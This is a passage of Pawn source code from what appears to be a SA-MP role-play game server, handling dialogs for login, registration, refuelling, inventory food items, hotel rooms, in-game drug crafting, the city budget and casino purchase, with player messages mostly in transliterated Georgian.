						LoadPlayerData(playerid);
						SetPlayerScore(playerid,pData[playerid][pLevel]);
					}
					else ShowPlayerDialog(playerid,dLogin2,3,"Usaprtxoebis Kodi","{96BCB0}Miutitet Usaprtxoebis Kodi.","NEXT","CLOSE");
				}
				else
				{
					SendClientMessage(playerid,CRED,"Paroli Arasworia.");
					NewKick(playerid);
				}
			}
		}
		case dLogin2:
		{
			new code[24];
			GetPVarString(playerid,"code",code,24);
			if(!strcmp(inputtext,code,false) && strlen(inputtext))
			{
				DeletePVar(playerid,"code");
				format(mes,sizeof(mes),"Avtorizacia Gavlilia | Saxeli : %s .",Name2(playerid));
				SendClientMessage(playerid,0x739F95FF,mes);
				LoadPlayerData(playerid);
				SetPlayerScore(playerid,pData[playerid][pLevel]);
			}
			else
			{
				SendClientMessage(playerid,CRED,"Usaprtxoebis Kodi Arasworia.");
				NewKick(playerid);
			}
		}
		case dRegister:
		{
			if(!response)
			{
				SendClientMessage(playerid,CWHITE,"Daweret /q Tamashis Gasatishad.");
				NewKick(playerid);
			}
			else if(!strlen(inputtext)) SPFD(playerid,dRegister,3,"{FFF000}Registracia","NEXT","EXIT","{AD92F0}Mogesalmebit Serverze Difficult Stage Real Life.\n{B2A7CC}Name: {EBC9C9}%s{"#cWHITE"}\n\nAccount-s Chirdeba Registracia.\nRegistraciisatvis Miutitet Tqveni Paroli:",pRegData[playerid][0]);
			else
			{
				if(strfind(inputtext,"|") != -1)
				{
					SendClientMessage(playerid,CGRAY,"У Вас в пароле присутствуют запрещенные символы.");
					SPFD(playerid,dRegister,3,"Axali Personajis Registracia","NEXT","EXIT","{AD92F0}Mogesalmebit Serverze Difficult Stage Real Life.\n{B2A7CC}Name: {EBC9C9}%s{"#cWHITE"}\n\nAccount-s Chirdeba Registracia.\nRegistraciisatvis Miutitet Tqveni Paroli:",pRegData[playerid][0]);
					return true;
				}
				if(strlen(inputtext) <6 || strlen(inputtext) > 22)
				{
					SendClientMessage(playerid,CWHITE,"Paroli Ar Unda Sheicavdes 6-Ze Nakleb Da 22-Ze Met Simbolos.");
					SPFD(playerid,dRegister,3,"Axali Personajis Registracia","NEXT","BACK","{AD92F0}Mogesalmebit Serverze Difficult Stage Real Life.\n{B2A7CC}Name: {EBC9C9}%s{"#cWHITE"}\n\nAccount-s Chirdeba Registracia.\nRegistraciisatvis Miutitet Tqveni Paroli:",pRegData[playerid][0]);
					return true;
				}
				/*new name[MAX_PLAYER_NAME];
			    GetPlayerName(playerid, name, sizeof(name));
			    if(strfind(name,"_",true,1) == -1)
			    {
			        SendClientMessage(playerid, CRED, "Вы были кикнуты сервером, по причине использования НОН-РП НИКА.");
			        SendClientMessage(playerid, CRED, "Ник должен быть по форме: Имя_Фамилия. Пример: Ivan_Gudkov, Alisa_Tapkina");
			        NewKick(playerid);
			        return true;
			    }*/
				mysql_real_escape_string(inputtext,pRegData[playerid][1]);
				mysql_real_escape_string(inputtext,pRegData[playerid][2]);
				ShowPlayerDialog(playerid,dRegister2,1,"Registracia","{"#cWHITE"}\tMiutitet Tqveni E-Mail:","NEXT","BACK");
			}
		}
		case dRegister2:
		{
			if(!response) {SPFD(playerid,dRegister,3,"Axali Personajis Registracia","NEXT","EXIT","{AD92F0}Mogesalmebit Serverze Difficult Stage Real Life.\n{B2A7CC}Name: {EBC9C9}%s{"#cWHITE"}\n\nAccount-s Chirdeba Registracia.\nRegistraciisatvis Miutitet Tqveni Paroli:",pRegData[playerid][0]); return true;}
			if(strfind(inputtext,"|") != -1)
			{
				SendClientMessage(playerid,CGRAY,"Tqven Miutitet Akrdzaluli Simbolo.");
				SPFD(playerid,dRegister,3,"Axali Personajis Registracia","Next","Exit","{AD92F0}Mogesalmebit Serverze Difficult Stage Real Life.\n{B2A7CC}Name: {EBC9C9}%s{"#cWHITE"}\n\nAccount-s Chirdeba Registracia.\nRegistraciisatvis Miutitet Tqveni Paroli:",pRegData[playerid][0]);
				return true;
			}
			if(strfind(inputtext, "@", true) == -1 || strfind(inputtext, ".", true) == -1)
			{
				SendClientMessage(playerid,CGRAY,"E-Mail Ar Arsebobs. Cadet Xelaxla.");
				ShowPlayerDialog(playerid,dRegister2,1,"Registracia","{"#cWHITE"}\tMiutitet Tqveni E-Mail:","NEXT","BACK");
			}
			else
			{
				mysql_real_escape_string(inputtext,pRegData[playerid][2]);
				ShowPlayerDialog(playerid,dRegister3,0,"Registracia","{"#cWHITE"}\tAirchiet Personajis Sqesi:","Qali","Mamakaci");
			}
		}
		case dRegister3:
		{
			if(response) pRegData[playerid][3][0] = 2; //жен
			else pRegData[playerid][3][0] = 1; //муж
			ShowPlayerDialog(playerid,dRegister8,1,"Axali Personajis Registracia","{"#cWHITE"}Miutitet Tqveni Personajis Wlovaneba:\nWlovaneba Unda Iyos 10-Dan 50-Wlamde.","Registracia","");
		}
		case dRegister8:
		{
			if(!response) return ShowPlayerDialog(playerid,dRegister8,1,"Axali Personajis Registracia","{"#cWHITE"}Miutitet Tqveni Personajis Wlovaneba:\nWlovaneba Unda Iyos 10-Dan 50-Wlamde.","Registracia","");

			if(!isNumeric(inputtext))
			{
				SendClientMessage(playerid,CGRAY,"Asaki Daweret Ciprebit. Daiwyet 11-Tidan");
				ShowPlayerDialog(playerid,dRegister8,1,"Axali Personajis Registracia","{"#cWHITE"}Miutitet Tqveni Personajis Wlovaneba:\nWlovaneba Unda Iyos 10-Dan 50-Wlamde.","Registracia","");
				return true;
			}
			new age = strval(inputtext);
			if(age <= 10 || age >= 50)
			{
				SendClientMessage(playerid,CGRAY,"Wlovaneba Ar Unda Iyos 10-Ze Naklebi Da 50-ze Meti");
				ShowPlayerDialog(playerid,dRegister8,1,"Axali Personajis Registracia","{"#cWHITE"}Miutitet Tqveni Personajis Wlovaneba:\nWlovaneba Unda Iyos 10-Dan 50-Wlamde.","Registracia","");
				return true;
			}
			RegisterPlayer(playerid,age);
		}
		case dFillBuy:
		{
		    if(!response) return true;
		    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Avtomobolshi.");
			new vehicleid = GetPlayerVehicleID(playerid);
			//if(GetEngineStat(vehicleid) == 1) return SendClientMessage(playerid,CGRAY,"Заправляться можно только с заглушенным двигателем");
			new modelid = GetVehicleModel(vehicleid) - 400;
			if(!gTransport[modelid][trFuelable]) return SendClientMessage(playerid,CGRAY,"Tqven Avtomobils Araqvs Gazis Avzi");
			new fillingid = -1;
			for(new i;i<FILLING_COUNT;i++)
			{
				if(!IsPlayerInDynamicArea(playerid,gAreas[arFill][i])) continue;
				else fillingid = i;
			}
			if(fillingid == -1) return SendClientMessage(playerid,CGRAY,"Tqven Unda Iyot Gaz Gasamart Sadgurze");
			if(GetPlayerMoneyEx(playerid) < 700) return SendClientMessage(playerid,CGRAY,"Shen Gaqvs Arasakmarisi Tanxa (700$)");
			TransferMoney(playerid,-1,700);
			gVehicles[vehicleid-1][vFuel] = 100;
			SendClientMessage(playerid,CGREEN,"Manqana Gazapravkebulia. Ketili Mgzavroba");
		}
		case dTirD: if(response) return ShowTirDialog(playerid);
		case dTirD1:
  		{
  		    if(!response) return true;
  		    if(GetPlayerMoneyEx(playerid) < TGunInfo[listitem][tgCost]) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa");
            ResetPlayerWeapons(playerid);
            PlayerTir[playerid] = TirPlayer[playerid];
            new tir = PlayerTir[playerid];
            for(new i;i < 5;i ++)
            {
                HitPoint[playerid][i] = false;
        		HitCount[playerid][i] = 0;
            }
            TargetCount[playerid] = 0;
            TirBusy[tir] = true;
            TimerTime[playerid] = 10000;
            if(TargetTimer[tir] != -1) KillTimer(TargetTimer[tir]);
            TargetTimer[tir] = SetTimerEx("MoveTarget", 1000, false, "i", playerid);
            TirGun[playerid] = TGunInfo[listitem][tgGunid];
            TransferMoney(playerid,-1,TGunInfo[listitem][tgCost]);
			UpdateDynamic3DTextLabelText(TirText[tir],CGREEN,"-== Tir ==-\n\n{AFAFAF}Dakavebulia");
			TextDrawShowForPlayer(playerid, TirBGDraw);
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		    {
		        i = cvector_get(players, idxf);
		        if(!IsPlayerConnected(i)) continue;
		        TogglePlayerDynamicCP(i, Tir_CP[tir], false);
			}
		}
		case dCloth:
		{
      		if(!response) return true;
			new id = strval(inputtext), id1;
			if(GetPVarInt(playerid,"iderid") == 1)
			{
			    if(pData[playerid][pSkin] == 90 || pData[playerid][pSkin] == 252) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Tansacmeli");
				id1 = pData[playerid][pSkin];
			}
			else if(GetPVarInt(playerid,"iderid") == 2)
			{
			    if(!pData[playerid][pFraction] || pData[playerid][pFraction] == 90 || pData[playerid][pFraction] == 252) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Organizaciis Tansacmeli");
				id1 = pData[playerid][pFractionSkin];
			}
    		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
	     	if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
	 		format(mes,sizeof(mes),"Tqven Shestavazet {"#cWHITE"}%s {"#cINFO"}Miigos Tansacmeli (id:%d)",Name2(id),id1);
	 		SendClientMessage(playerid,CINFO,mes);
	 		format(mes,sizeof(mes),"%s {"#cINFO"}Surs Gadmogcet Tansacmeli (id:%d)",Name2(playerid),id1);
	 		SendClientMessage(id,CWHITE,mes);
	 		SendClientMessage(id,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y{"#cINFO"}, Uaryopistvis {"#cRED"}N");
	 		SetPVarInt(id,"21ShowDiplpl",playerid);
			SetPVarInt(id,"21ShowDiplact",id);
			SetPVarInt(id,"321ShowDiplact",id1);
			return true;
		}
		case dCloth1:
		{
		    if(!response) return true;
	 		ShowPlayerDialog(playerid,dCloth,1,"Cvlis Tansacmels","{ffffff}Dawere Motamashis ID, Vistvisac Gusrt Gaagzavnot Tansacmeli","Shemdegi","Daxurva");
	        SetPVarInt(playerid,"iderid",listitem+1);
		}
		case dRecep:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0:
		        {
		            if(pData[playerid][pOtel] > 0) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Gaqvt Otaxi.");
					ShowPlayerDialog(playerid, dRecep2, DIALOG_STYLE_LIST, "Shesasyidi Otaxi", "1. Otaxi №1\n2. Otaxi №2\n3. Otaxi №3\n4. Otaxi №4\n5. Otaxi №5\n6. Otaxi №6\n7. Otaxi №7\n8. Otaxi №8\n9. Otaxi №9\n10. Otaxi №10\n11. Otaxi №11\n12. Otaxi №12\n13. Otaxi №13\n14. Otaxi №14\n15. Otaxi №15\n16. Otaxi №16\n17. Otaxi №17\n18. Otaxi №18", "Archeva", "Daxurva");
		        }
		        case 1:
		        {
					if(pData[playerid][pOtel] < 1) return SendClientMessage(playerid,CGRAY,"Shen Argaqvs Otaxi");
					pData[playerid][pOtel] = 0;
					pData[playerid][pOtelNomer] = 0;
					UpdatePlayerData(playerid,"otel",pData[playerid][pOtel]);
					UpdatePlayerData(playerid,"otelnomer",pData[playerid][pOtelNomer]);
					TransferMoney(-1,playerid,2500);
					SendClientMessage(playerid,CGRAY,"Tqven Gayidet Sastumros Otaxi. Amitom Dagibrundat Yidvisas Gadaxdili Tanxis Naxevari. (2500$)");
		        }
			}
		}
		case dRecep2:
		{
		    if(!response) return true;
		    if(GetPlayerMoneyEx(playerid) < 5000) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa (5000$)");
		    TransferMoney(playerid,-1,5000);
		    new Text[5];
            if(GetPlayerVirtualWorld(playerid) == 1) strcat(Text,"LS"), pData[playerid][pOtel] = 1;
            else if(GetPlayerVirtualWorld(playerid) == 2) strcat(Text,"SF"), pData[playerid][pOtel] = 2;
            else if(GetPlayerVirtualWorld(playerid) == 3) strcat(Text,"LV"), pData[playerid][pOtel] = 3;
			pData[playerid][pOtelNomer] = listitem+1;
			UpdatePlayerData(playerid,"otel",pData[playerid][pOtel]);
			UpdatePlayerData(playerid,"otelnomer",pData[playerid][pOtelNomer]);
			format(mes,sizeof(mes),"Gilocavt Tqven Sheidzinet Otaxi №%d Sastumroshi %s 5000$-D .",listitem+1,Text);
            SendClientMessage(playerid,CGREEN,mes);
			PlayerPlaySound(playerid,1185,0.0,0.0,0.0);
			SetTimerEx("PlayerPlaySoundDelay",6900,false,"ii",playerid,1186);
		}
		case dBuyKit:
		{
		    if(!response) return true;
		    if(GetPlayerMoneyEx(playerid) < Dvijki(playerid)) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa");
		    TransferMoney(playerid,-1,Dvijki(playerid));
		    pData[playerid][pDvijok] = 1;
			UpdatePlayerData(playerid,"dvijok",1);
		    SendClientMessage(playerid,CGREEN,"Gilocavt Tqven Sheidzinet Kit Da Avtomobili. Axali Avtoparexit, Shegidzliat Shecvalot Sistema.");
		}
		case dInver:
  		{
            if(!response) return true;
  		    if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 0 && InventoryPlayer[playerid][invKol][GetPVarInt(playerid,"SelectSlot") - 1] == 0) return true;
  		    if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] != 0 && InventoryPlayer[playerid][invKol][GetPVarInt(playerid,"SelectSlot") - 1] != 0)
  		    {
  		        if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 29)
  		        {
  		            pTemp[playerid][pEda][0] -= 1;
  		            SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,2703,6,0.079999,0.065999,0.015999,0.000000,-11.100000,84.900047,1.000000,1.000000,1.000000);
  		            SetPlayerSpecialAction(playerid, 0);
					ClearAnimations(playerid,1);
					RemovePlayerAttachedObject(playerid,0);
 					ApplyAnimation(playerid,"FOOD","EAT_Burger", 2.0,0,0,0,0,5000,1);
 					MeAction(playerid,"съел(-а) гамбургер");
 					if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 100;
 					if(pTemp[playerid][pEda][0] < 1) inventUP(playerid);
 					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 31)
  		        {
  		            pTemp[playerid][pEda][1] -= 1;
  		            SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,19346,6,0.059000,0.059999,0.000000,-97.399963,0.000000,0.000000);
  		            SetPlayerSpecialAction(playerid, 0);
					ClearAnimations(playerid,1);
					RemovePlayerAttachedObject(playerid,0);
 					ApplyAnimation(playerid,"FOOD","EAT_Burger", 2.0,0,0,0,0,5000,1);
 					MeAction(playerid,"съел(-а) салат");
 					if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 100;
 					if(pTemp[playerid][pEda][1] < 1) inventUP(playerid);
 					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 32)
  		        {
  		            pTemp[playerid][pEda][3] -= 1;
  		            SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,1546,5,0.126999,0.044999,-0.027000,15.999998,-175.499862,1.400000,1.000000,1.000000,1.000000);
  		            SetPlayerSpecialAction(playerid, 0);
					ClearAnimations(playerid,1);
					RemovePlayerAttachedObject(playerid,0);
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink2_P", 2.0,0,0,0,0,5000,1);
 					MeAction(playerid,"выпил(-а) sprunk");
 					if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 50;
 					if(pTemp[playerid][pEda][3] < 1) inventUP(playerid);
 					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 33)
  		        {
  		            pTemp[playerid][pEda][4] -= 1;
  		            SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,1951,5,0.126999,0.044999,-0.027000,15.999998,-175.499862,1.400000,1.000000,1.000000,1.000000);
  		            SetPlayerSpecialAction(playerid, 0);
					ClearAnimations(playerid,1);
					RemovePlayerAttachedObject(playerid,0);
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink2_P", 2.0,0,0,0,0,5000,1);
 					MeAction(playerid,"выпил(-а) пиво");
 					if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 50;
 					if(pTemp[playerid][pEda][4] < 1) inventUP(playerid);
 					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 34)
  		        {
  		            pTemp[playerid][pEda][5] -= 1;
  		            SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,1668,5,0.126999,0.044999,-0.027000,15.999998,-175.499862,1.400000,1.000000,1.000000,1.000000);
  		            SetPlayerSpecialAction(playerid, 0);
					ClearAnimations(playerid,1);
					RemovePlayerAttachedObject(playerid,0);
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink2_P", 2.0,0,0,0,0,5000,1);
 					MeAction(playerid,"выпил(-а) водку");
 					if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 50;
 					if(pTemp[playerid][pEda][5] < 1) inventUP(playerid);
 					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 35)
  		        {
  		            pTemp[playerid][pEda][6] -= 1;
  		            SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,1520,5,0.126999,0.044999,-0.027000,15.999998,-175.499862,1.400000,1.000000,1.000000,1.000000);
  		            SetPlayerSpecialAction(playerid, 0);
					ClearAnimations(playerid,1);
					RemovePlayerAttachedObject(playerid,0);
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink2_P", 2.0,0,0,0,0,5000,1);
 					MeAction(playerid,"выпил(-а) брэнди");
 					if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 50;
 					if(pTemp[playerid][pEda][6] < 1) inventUP(playerid);
 					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 36)
  		        {
  		            pTemp[playerid][pEda][7] -= 1;
  		            SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,1487,5,0.126999,0.044999,-0.027000,15.999998,-175.499862,1.400000,1.000000,1.000000,1.000000);
  		            SetPlayerSpecialAction(playerid, 0);
					ClearAnimations(playerid,1);
					RemovePlayerAttachedObject(playerid,0);
 					ApplyAnimation(playerid, "VENDING", "VEND_Drink2_P", 2.0,0,0,0,0,5000,1);
 					MeAction(playerid,"выпил(-а) вино");
 					if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 50;
 					if(pTemp[playerid][pEda][7] < 1) inventUP(playerid);
 					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 28)
  		        {
  		            pTemp[playerid][pEda][8] -= 1;
  		            SetTimerEx("RemovePlayerAttachedObjectDelay",4000,false,"ii",playerid,1), SetPlayerAttachedObject(playerid,1,2769,6,0.095999,0.073999,0.049000,-156.000030,-81.899986,12.599999,1.000000,1.000000,1.000000);
  		            SetPlayerSpecialAction(playerid, 0);
					ClearAnimations(playerid,1);
					RemovePlayerAttachedObject(playerid,0);
 					ApplyAnimation(playerid,"FOOD","EAT_Burger", 2.0,0,0,0,0,5000,1);
 					MeAction(playerid,"съел(-а) шаурму");
 					if(pData[playerid][pHunger] <= 500) pData[playerid][pHunger] += 150;
					if(pTemp[playerid][pEda][8] < 1) inventUP(playerid);
 					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 37)
  		        {
  		            SetPVarInt(playerid,"USE_INV",gettime()+2);
					OnPlayerCommandText(playerid,"/map");
					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 25)
  		        {
  		            SetPVarInt(playerid,"USE_INV",gettime()+2);
					OnPlayerCommandText(playerid,"/drugs");
					if(pData[playerid][pDrugs] < 1) inventUP(playerid);
					CloseInventory(playerid);
  		        }
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 42) {}
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 43) {}
  		        else if(InventoryPlayer[playerid][invSlot][GetPVarInt(playerid,"SelectSlot") - 1] == 44) {}
  		        else {}
  		    }
		}
		case dGrain:
		{
		    if(!response) return true;
		    if(pData[playerid][pGrain] < 10) return SendClientMessage(playerid,CGRAY, "Narkotikis Shesaqmnelad Tqven Unda Gqondet Minimum 10 Marcvali.");
		    ShowPlayerDialog(playerid,dGrain2,DIALOG_STYLE_INPUT,"Sheqmna Narkotikebi","{"#cWHITE"}Narkotikebis Raodenoba","Shemdegi","Daxurva");
		}
		case dGrain2:
  		{
  		    if(!response) return true;
  		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dGrain2,DIALOG_STYLE_INPUT,"Sheqmna Narkotikebi","{"#cWHITE"}Narkotikebis Raodenoba","Shemdegi","Daxurva");
		    new drug = strval(inputtext);
  		    if(pData[playerid][pGrain] < 10) return SendClientMessage(playerid,CGRAY, "Narkotikis Shesaqmnelad Tqven Unda Gqondet Minimum 10 Marcvali.");
  		    if(drug < 1 || drug > 100) return SendClientMessage(playerid,CGRAY,"Minimaluri - 1, Maqsimaluri - 100");
  		    if(pData[playerid][pGrain] < drug*10) return SendClientMessage(playerid,CGRAY, "Tqven Gaqvt Arasakmarisi Marcvali.");
  		    pData[playerid][pGrain] -= drug*10;
  		    Pokaz(playerid,5,drug*10,0);
  		    UpdatePlayerData(playerid,"grain",pData[playerid][pGrain]);
  		    SetPVarInt(playerid,"grains",drug);
  		    ClearAnimations(playerid);
			GameTextForPlayer(playerid, "~y~Daicadet 60 Wami.~n~~p~Rroduction goes", 55000, 1);
			ApplyAnimation(playerid,"GRAFFITI","spraycan_fire",4.0,1,1,1,0,60000,0);
			SetTimerEx("GrainSTART",60000,false,"i",playerid);
		}
		case dRazvod:
		{
		    new query[128];
			format(query,sizeof(query),"UPDATE `accounts` SET divorce = '' WHERE nickname = '%s'",Name2(playerid));
	       	mysql_empty(mysql, query);
	       	format(query,sizeof(query),"UPDATE `accounts` SET divorce = '' WHERE nickname = '%s'",pData[playerid][pDivorce]);
	       	mysql_empty(mysql, query);
	       	SetString(pData[playerid][pDivorce],"");
		    SendClientMessage(playerid,CGREEN,"Tqven Warmatebit Gaauqmet Qorwineba");
		}
		case dMeriya:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0:
		        {
		            format(mes,sizeof(mes),"Saxelmwipo Biujeti: %d$",Kazna);
		            SendClientMessage(playerid,CGREEN,mes);
		        }
		        case 1: ShowPlayerDialog(playerid,dMeriya2,DIALOG_STYLE_INPUT,"Puli Biujetshi","{"#cWHITE"}Shecvlis Raodenoba","Shemdegi","Daxurva");
		        case 2: ShowPlayerDialog(playerid,dMeriya3,DIALOG_STYLE_INPUT," Sagandzuri / Puli Biujetshi","{"#cWHITE"}Shecvlis Raodenoba","Shemdegi","Daxurva");
			}
		}
		case dMeriya2:
		{
		    if(!response) return true;
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dMeriya2,DIALOG_STYLE_INPUT,"Puli Biujetshi","{"#cWHITE"}Shecvlis Raodenoba","Shemdegi","Daxurva");
		    new mers = strval(inputtext);
		    if(mers < 1 || mers > 1000000) return SendClientMessage(playerid,CGRAY,"Minimaluri - 1$, Maqsimaluri - 1000000$");
		    if(GetPlayerMoneyEx(playerid) < mers) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa");
		    Kazna += mers;
		    TransferMoney(playerid,-1,mers);
		    SendClientMessage(playerid,CGRAY,"Tqven Wamratebit Ganatavset Puli Biujetshi.");
        }
        case dMeriya3:
		{
		    if(!response) return true;
		    if(pData[playerid][pRank] != 15) return SendClientMessage(playerid,CGRAY,"Biujetis Pulit Sargebloba Sheudzlia Mxolod Maiors.");
		    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,dMeriya3,DIALOG_STYLE_INPUT,"Puli Biujetshi","{"#cWHITE"}Shecvlis raodenoba","Shemdegi","Daxurva");
            new mers = strval(inputtext);
			if(mers < 1 || mers > 1000000) return SendClientMessage(playerid,CGRAY,"Minimaluri - 1$, Maqsimaluri - 1000000$");
			if(Kazna < mers) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa Biujetshi");
		    Kazna -= mers;
		    TransferMoney(-1,playerid,mers);
		    SendClientMessage(playerid,CGRAY,"Tqven Warmatebit Ganatavset Puli Biujetshi.");
        }
        case dGaraj:
        {
            if(!response) return true;
            if(!pData[playerid][pCar] || (!pData[playerid][pHouse])) return SendClientMessage(playerid,CGRAY,"Tqven Argyavt Avtomobili");
		    switch(listitem)
		    {
		        case 0:
		        {
		            new houseid = pData[playerid][pHouse]-1;
					if(GetString(Name2(playerid),gHouses[houseid][houseOwner]))
					{
					    SetVehiclePos(gVehicles[pData[playerid][pHouse]][vvID], 1390.2004,-20.2526,1000.6414);
					    SetVehicleZAngle(gVehicles[pData[playerid][pHouse]][vvID], 246.9149);
						LinkVehicleToInterior(gVehicles[pData[playerid][pHouse]][vvID], 18);
					 	SetVehicleVirtualWorld(gVehicles[pData[playerid][pHouse]][vvID], playerid);
					 	SetPVarInt(playerid,"sdsds",1);
					}
		        }
		        case 1:
		        {
					new houseid = pData[playerid][pHouse]-1;
					if(GetString(Name2(playerid),gHouses[houseid][houseOwner]))
					{
					    LinkVehicleToInterior(gVehicles[pData[playerid][pHouse]][vvID], 0);
					 	SetVehicleVirtualWorld(gVehicles[pData[playerid][pHouse]][vvID], 0);
					    SetVehicleToRespawn(gVehicles[pData[playerid][pHouse]][vvID]);
					    SetPVarInt(playerid,"sdsds",0);
					}
		        }
		        case 2:
		        {
		            if(pData[playerid][pDvijok] != 1) return SendClientMessage(playerid,CGRAY,"Tqven Argaqvt Dzrava, Magram Tqven Shegildziat Sheidziniot Igi Da Daaumushaot");
					if(pData[playerid][pLimit] == 1) return SendClientMessage(playerid,CGRAY,"Sheicvleba Dzrava Romelic Avtomobilistvisaa.");
					if(GetPVarInt(playerid,"sdsds") != 1) return SendClientMessage(playerid,CGRAY,"Iyideba Svtomobili Avtoparexit.");
					new engine,lights,alarm,doors,bonnet,boot,objective;
			  		GetVehicleParamsEx(gVehicles[pData[playerid][pHouse]][vvID],engine,lights,alarm,doors,bonnet,boot,objective);
			        SetVehicleParamsEx(gVehicles[pData[playerid][pHouse]][vvID],engine,lights,alarm,doors,1,boot,objective);
			        SetPlayerPos(playerid,1387.5520,-17.9535,1000.9229);
			        SetPlayerFacingAngle(playerid,224.9290);
			        GoAnim(playerid,"CAR_CHAT","car_talkm_loop",4.1,1,0,0,0,0,0);

                    pData[playerid][pDvijok] = 0;
                    pData[playerid][pLimit] = 1;
			        UpdatePlayerData(playerid,"dvijok",0);
			        UpdatePlayerData(playerid,"limit",1);

			        TextDrawShowForPlayer(playerid, RegisterLoginTD[playerid]);
					LST[playerid] = SetTimerEx("LoadingScreenTimer",1000,true,"d",playerid);
					InterpolateCameraPos(playerid, 1379.284545, -13.561935, 1003.019165, 1394.673217, -26.049509, 1002.897583, 100000);
					InterpolateCameraLookAt(playerid, 1383.451904, -16.250499, 1002.383239, 1391.216186, -22.681480, 1001.591674, 100000);
				}
		    }
        }
		case dCasino:
		{
		    if(!response) return true;
		    ShowPlayerDialog(playerid,dCasino2,2,"Kazinos Martva","1. Iyide Kazinо\n2. Kazinos Informacia\n3. Aige Mteli Fuli Kazinodan\n4. Gayide Kazino","OK","CLOSE");
		}
		case dCasino2:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0:
          		{
                    if(gCasino[0][casinoOwner]) return SendClientMessage(playerid,CGRAY,"Kazino Ukve Nayidia.");
                    if(GetPlayerMoneyEx(playerid) < gCasino[0][casinoPrice]) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa");
                    new query[256];
					format(query,sizeof(query),"UPDATE `casino` SET `owner` = '%s' WHERE `id` = '1'",Name2(playerid));
					mysql_empty(mysql, query);
					if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL (Yidva Kazinosi)");
					SendClientMessage(playerid,CGREEN,"Tqven sheidzinet Kacino. Gilocavt.");
					TransferMoney(playerid,-1,gCasino[0][casinoPrice]);
					SetString(gCasino[0][casinoOwner],Name2(playerid));
		        }
		        case 1:
		        {
		            if(!gCasino[0][casinoOwner]) return SendClientMessage(playerid,CGRAY,"Aryavs Mplobeli.");
		            if(!GetString(Name2(playerid),gCasino[0][casinoOwner])) return SendClientMessage(playerid,CGRAY,"Tqven Arxart Mplobeli Kazinosi.");
